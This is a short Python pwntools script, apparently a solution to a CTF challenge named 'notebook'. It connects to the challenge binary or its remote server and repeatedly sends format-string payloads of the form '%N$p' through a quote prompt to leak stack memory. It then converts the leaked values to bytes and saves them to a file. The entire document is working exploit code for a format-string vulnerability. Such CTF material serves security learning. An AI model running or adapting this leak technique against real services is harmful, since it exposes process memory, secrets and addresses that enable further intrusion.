#!/usr/bin/env python3

from pwn import *

PROMPT = b"> "
LOCAL = False

def sendafter(p, s, prompt=PROMPT):
    p.recvuntil(prompt)
    p.sendline(s.encode())

def init(p): 
    sendafter(p, "4")
    sendafter(p, "FLAGFLAGFLAGFLAGFLAGFLAG", b"Note: ")
    sendafter(p, "5")
    sendafter(p, "2", b"delete?")

def get_bytes(num):
    if "nil" in num:
        return b""
    n = int(num, 16)
    return n.to_bytes(length=(8 + (n + (n < 0)).bit_length()) // 8, byteorder='little', signed=True)

def dump_stack(p):
    ll = b""
    for i in range(1, 501, 5):
        payload = f"%{i}$p.%{i+1}$p.%{i+2}$p.%{i+3}$p.%{i+4}$p"
        sendafter(p, "3")
        sendafter(p, payload, b"Quote:")
        res = p.recvuntil(PROMPT).decode("utf-8")
        r = res.split("\n")[1].strip("< >\t").split(".")
        for l in r:
            ll += get_bytes(l) 
    open("result", "wb").write(ll)

def main():
    if LOCAL:
        p = process("./notebook")
        init(p)
    else:
        p = remote("pwn-notebook.2021.ctfcompetition.com", 1337)
    dump_stack(p)

if __name__ == "__main__":
    main()
